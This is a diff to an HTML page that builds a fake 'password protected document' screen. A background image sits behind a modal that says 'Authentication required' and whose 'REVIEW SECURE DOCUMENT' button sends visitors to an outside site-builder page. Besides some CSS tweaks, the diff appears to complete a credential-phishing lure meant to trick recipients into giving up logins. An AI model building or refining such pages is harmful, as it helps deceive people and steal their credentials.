@@ -14,19 +14,19 @@
     html, body {
       height: 100%;
       font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
     }
 
     body {
+      position: relative;
       display: flex;
       justify-content: center;
       align-items: center;
       padding: 2rem;
-      background-color: #f0f0f0;
-      position: relative;
       overflow: hidden;
     }
 
-    /* Background image via <img> for precision */
+    /* Background image */
     .bg-image {
       position: absolute;
       top: 50%;
@@ -38,10 +38,13 @@
 
     .bg-image img {
       display: block;
-      max-width: 100%;
+      width: auto;
       height: auto;
+      max-width: 100%;
+      max-height: 100%;
     }
 
+    /* Modal */
     .modal {
       position: relative;
       z-index: 1;
@@ -80,7 +83,7 @@
       background-color: #1a54d3;
     }
 
-    /* PRINT/PDF fallback — in case PDF tool breaks flexbox */
+    /* PDF safe fallback */
     @media print {
       body {
         display: block;
@@ -90,16 +93,11 @@
       .bg-image {
         display: block;
         position: relative;
-        transform: none;
         top: auto;
         left: auto;
+        transform: none;
         margin-bottom: 20px;
         text-align: center;
-      }
-
-      .bg-image img {
-        max-width: 100%;
-        height: auto;
       }
 
       .modal {
@@ -110,10 +108,17 @@
 </head>
 <body>
 
-  <!-- ✅ Replace src="" with your actual PostImage link -->
+  <!-- ✅ Background image from PostImage (your link) -->
   <div class="bg-image">
     <img src="https://i.postimg.cc/QCPLCsx9/canva-bg.png" alt="Background" />
   </div>
 
+  <!-- ✅ The modal -->
   <div class="modal">
-    <h2>Authenti
+    <h2>Authentication required</h2>
+    <p>This document is password protected. Please authenticate to view the document.</p>
+    <a href="https://webador.com/" class="review-btn" target="_blank">REVIEW SECURE DOCUMENT</a>
+  </div>
+
+</body>
+</html>
